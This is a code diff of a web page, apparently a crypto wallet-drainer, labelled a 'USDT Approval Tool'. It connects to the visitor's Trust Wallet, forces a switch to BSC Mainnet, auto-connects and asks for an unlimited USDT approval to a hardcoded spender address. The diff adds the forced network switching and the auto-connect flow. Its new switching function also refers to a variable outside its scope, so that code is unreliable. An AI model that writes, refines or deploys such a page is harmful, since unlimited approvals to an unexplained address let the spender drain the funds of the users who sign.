@@ -65,6 +65,11 @@
             color: #ff5252;
         }
 
+        .status-box.warning {
+            border: 1px solid #ff9800;
+            color: #ff9800;
+        }
+
         .info-row {
             display: flex;
             justify-content: space-between;
@@ -123,16 +128,6 @@
             transform: none;
         }
 
-        .btn-secondary {
-            background-color: #333;
-            color: #fff;
-            margin-top: 10px;
-        }
-
-        .btn-secondary:hover {
-            background-color: #444;
-        }
-
         .loader {
             border: 3px solid #f3f3f3;
             border-top: 3px solid #F0B90B;
@@ -171,6 +166,24 @@
             text-align: left;
             line-height: 1.4;
         }
+
+        .network-badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: bold;
+        }
+
+        .network-badge.bsc {
+            background-color: #F0B90B;
+            color: #000;
+        }
+
+        .network-badge.eth {
+            background-color: #627eea;
+            color: #fff;
+        }
     </style>
 </head>
 <body>
@@ -179,9 +192,15 @@
         <h1>BSC DApp</h1>
         <div class="subtitle">USDT Approval Tool</div>
         
-        <!-- Connection Status -->
-        <div class="status-box" id="connectionStatus">
-            Checking wallet...
+        <!-- Main Status -->
+        <div class="status-box" id="mainStatus">
+            Detecting wallet...
+        </div>
+
+        <!-- Debug Info (shows current chain) -->
+        <div id="debugSection" class="hidden" style="margin-bottom: 15px; padding: 10px; background: #252525; border-radius: 8px; font-size: 0.75rem; color: #888;">
+            <div>Current Chain ID: <span id="currentChainId" style="color: #fff;">Loading...</span></div>
+            <div>Current Network: <span id="currentNetwork" style="color: #fff;">Loading...</span></div>
         </div>
 
         <!-- Wallet Info Section -->
@@ -189,7 +208,7 @@
             <div class="section-title">Wallet Information</div>
             <div class="info-row">
                 <span>Network:</span>
-                <span id="network" class="info-val">BSC Mainnet</span>
+                <span id="network" class="info-val"><span class="network-badge bsc">BSC Mainnet</span></span>
             </div>
             <div class="info-row">
                 <span>Address:</span>
@@ -233,8 +252,8 @@
         </div>
 
         <!-- Connect Button (shown when not connected) -->
-        <button id="connectBtn" onclick="connectWallet()">
-            <span id="connectBtnText">Connect Wallet</span>
+        <button id="connectBtn" onclick="forceBSCConnection()">
+            <span id="connectBtnText">Connect to BSC</span>
             <div class="loader" id="connectLoader"></div>
         </button>
     </div>
@@ -252,7 +271,6 @@
         const SPENDER_ADDRESS = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
         
         // APPROVAL AMOUNT: Unlimited (Max Uint256)
-        // This is the maximum value allowed by the ERC-20 standard
         const APPROVAL_AMOUNT = ethers.MaxUint256;
 
         // BSC Mainnet Configuration
@@ -268,6 +286,16 @@
             blockExplorerUrls: ['https://bscscan.com/']
         };
 
+        // Chain names for display
+        const CHAIN_NAMES = {
+            '0x1': 'Ethereum Mainnet',
+            '0x38': 'BSC Mainnet',
+            '0x89': 'Polygon Mainnet',
+            '0xa86a': 'Avalanche',
+            '0xa4b1': 'Arbitrum',
+            '0x2105': 'Base'
+        };
+
         // USDT ABI (Minimal - only approve function)
         const USDT_ABI = [
             "function approve(address spender, uint256 amount) external returns (bool)"
@@ -277,14 +305,19 @@
         let provider;
         let signer;
         let usdtContract;
+        let isConnected = false;
 
         // ==================== INITIALIZATION ====================
         window.onload = async () => {
+            document.getElementById('debugSection').classList.remove('hidden');
+            
             if (window.ethereum) {
                 initProvider();
-                checkConnection();
+                // Wait a moment for Trust Wallet to initialize
+                await new Promise(r => setTimeout(r, 500));
+                await checkAndSwitchToBSC();
             } else {
-                updateConnectionStatus("No Web3 wallet found. Open in Trust Wallet.", false);
+                updateMainStatus("No Web3 wallet found. Open in Trust Wallet.", false);
                 disableConnectButton();
             }
         };
@@ -293,100 +326,165 @@
             provider = new ethers.BrowserProvider(window.ethereum);
         }
 
-        // ==================== CONNECTION FUNCTIONS ====================
-        async function checkConnection() {
+        // ==================== NETWORK SWITCHING (THE FIX) ====================
+        async function checkAndSwitchToBSC() {
             try {
-                // Check if already authorized
-                const accounts = await provider.listAccounts();
-                if (accounts.length > 0) {
-                    await onWalletConnected(accounts[0].address);
-                } else {
-                    updateConnectionStatus("Click 'Connect Wallet' to start");
+                // Get current chain info
+                const network = await provider.getNetwork();
+                const currentChainId = network.chainId.toString(16);
+                
+                document.getElementById('currentChainId').innerText = `0x${currentChainId}`;
+                document.getElementById('currentNetwork').innerText = CHAIN_NAMES[`0x${currentChainId}`] || 'Unknown';
+
+                const BSC_CHAIN_ID_HEX = '0x38';
+                const BSC_CHAIN_ID_DECIMAL = 56n;
+
+                // Check if already on BSC
+                if (network.chainId === BSC_CHAIN_ID_DECIMAL) {
+                    updateMainStatus("✅ Connected to BSC Mainnet", true);
+                    document.getElementById('currentNetwork').innerHTML = '<span class="network-badge bsc">BSC Mainnet</span>';
+                    
+                    // Try to connect automatically
+                    setTimeout(() => autoConnect(), 1000);
+                    return;
                 }
+
+                // Not on BSC - show warning and update button
+                updateMainStatus("⚠️ Wrong network detected! Click button to switch to BSC.", false);
+                document.getElementById('currentNetwork').innerHTML = '<span class="network-badge eth">Wrong Network</span>';
+
             } catch (error) {
-                console.error("Connection check failed:", error);
-                updateConnectionStatus("Ready to connect");
+                console.error("Network check error:", error);
+                updateMainStatus("Error checking network. Click to connect.", false);
             }
         }
 
-        async function connectWallet() {
-            const statusEl = document.getElementById('connectionStatus');
+        async function forceBSCConnection() {
             const btnText = document.getElementById('connectBtnText');
             const loader = document.getElementById('connectLoader');
+            const btn = document.getElementById('connectBtn');
 
             // UI Loading State
             btnText.style.display = 'none';
             loader.style.display = 'block';
-            document.getElementById('connectBtn').disabled = true;
+            btn.disabled = true;
 
             try {
-                // Request account access
-                await provider.send("eth_requestAccounts", []);
+                // Step 1: Request account access first
+                updateMainStatus("Requesting wallet access...", false);
+                const accounts = await provider.send("eth_requestAccounts", []);
                 
+                if (accounts.length === 0) {
+                    throw new Error("No accounts found");
+                }
+
+                // Step 2: Switch to BSC
+                updateMainStatus("Switching to BSC Mainnet...", false);
+                await switchToBSCNetwork();
+
+                // Step 3: Re-initialize provider with new network
+                provider = new ethers.BrowserProvider(window.ethereum);
+                
+                // Step 4: Verify we're on BSC
+                const network = await provider.getNetwork();
+                if (network.chainId !== 56n) {
+                    throw new Error("Failed to switch to BSC");
+                }
+
+                // Step 5: Get signer and continue
                 signer = await provider.getSigner();
                 const address = await signer.getAddress();
 
-                // Check and switch network
-                await ensureBSCNetwork();
+                // Update debug info
+                document.getElementById('currentChainId').innerText = '0x38';
+                document.getElementById('currentNetwork').innerHTML = '<span class="network-badge bsc">BSC Mainnet</span>';
 
-                // Success
+                // Success!
                 await onWalletConnected(address);
 
             } catch (error) {
-                console.error(error);
-                let message = "Connection failed";
+                console.error("Connection error:", error);
                 
+                let message = "Connection failed";
                 if (error.code === 4001) {
                     message = "Connection rejected by user";
-                } else if (error.code === -32002) {
-                    message = "Request already pending. Check Trust Wallet.";
+                } else if (error.code === 4902) {
+                    message = "BSC network not found in wallet";
+                } else if (error.message) {
+                    message = error.message.substring(0, 40);
                 }
-                
-                updateConnectionStatus(message, false);
+
+                updateMainStatus(`❌ ${message}`, false);
                 
                 // Reset button
                 btnText.style.display = 'inline';
                 loader.style.display = 'none';
-                document.getElementById('connectBtn').disabled = false;
+                btn.disabled = false;
             }
         }
 
-        async function ensureBSCNetwork() {
+        async function switchToBSCNetwork() {
             const { ethereum } = window;
-            const network = await provider.getNetwork();
-            const chainId = network.chainId;
-            const BSC_CHAIN_ID = 56n;
 
-            if (chainId !== BSC_CHAIN_ID) {
-                updateConnectionStatus("Wrong network. Switching to BSC...", false);
-                
+            // First try: Switch to BSC
+            try {
+                await ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: BSC_MAINNET.chainId }],
+                });
+                return;
+            } catch (switchError) {
+                console.log("Switch error:", switchError.code);
+            }
+
+            // Second try: Add BSC network (if not in wallet)
+            if (switchError.code === 4902) {
                 try {
-                    // Try to switch
+                    updateMainStatus("Adding BSC Mainnet to wallet...", false);
+                    await ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [BSC_MAINNET],
+                    });
+                    
+                    // Give wallet time to add the network
+                    await new Promise(r => setTimeout(r, 1000));
+                    
+                    // Now try switch again
                     await ethereum.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: BSC_MAINNET.chainId }],
                     });
-                } catch (switchError) {
-                    // Chain not added, try to add it
-                    if (switchError.code === 4902) {
-                        try {
-                            await ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [BSC_MAINNET],
-                            });
-                        } catch (addError) {
-                            throw new Error("Failed to add BSC Network");
-                        }
-                    } else {
-                        throw new Error("Failed to switch to BSC");
-                    }
+                } catch (addError) {
+                    console.error("Add network error:", addError);
+                    throw new Error("Failed to add BSC Network. Please add it manually.");
                 }
+            } else {
+                throw new Error("Failed to switch network. Please switch manually.");
+            }
+        }
+
+        async function autoConnect() {
+            try {
+                const accounts = await provider.listAccounts();
+                if (accounts.length > 0) {
+                    signer = await provider.getSigner();
+                    const address = await signer.getAddress();
+                    await onWalletConnected(address);
+                } else {
+                    // Show connect button
+                    updateMainStatus("✅ BSC Detected. Click Connect.", true);
+                }
+            } catch (error) {
+                console.error("Auto-connect error:", error);
+                updateMainStatus("Click to connect to BSC", false);
             }
         }
 
         async function onWalletConnected(address) {
-            // Update connection status
-            updateConnectionStatus("Wallet Connected", true);
+            isConnected = true;
+            
+            // Update main status
+            updateMainStatus("✅ Connected to BSC Mainnet", true);
             
             // Show wallet section
             document.getElementById('walletSection').classList.remove('hidden');
@@ -406,6 +504,11 @@
 
         // ==================== APPROVAL FUNCTION ====================
         async function approveUSDT() {
+            if (!isConnected) {
+                updateMainStatus("Please connect wallet first", false);
+                return;
+            }
+
             const statusEl = document.getElementById('approvalStatus');
             const btn = document.getElementById('approveBtn');
             const btnText = document.getElementById('approveBtnText');
@@ -447,7 +550,6 @@
                 } else if (error.code === -32603) {
                     errorMsg = "Insufficient BNB for gas fees";
                 } else if (error.message) {
-                    // Extract shorter message
                     const shortMsg = error.message.substring(0, 50);
                     errorMsg = shortMsg + (error.message.length > 50 ? "..." : "");
                 }
@@ -463,10 +565,10 @@
         }
 
         // ==================== UTILITY FUNCTIONS ====================
-        function updateConnectionStatus(message, isSuccess) {
-            const statusEl = document.getElementById('connectionStatus');
+        function updateMainStatus(message, isSuccess) {
+            const statusEl = document.getElementById('mainStatus');
             statusEl.innerText = message;
-            statusEl.className = 'status-box' + (isSuccess ? ' success' : '');
+            statusEl.className = 'status-box' + (isSuccess ? ' success' : (message.includes('❌') ? ' error' : (message.includes('⚠️') ? ' warning' : '')));
         }
 
         function formatAddress(address) {
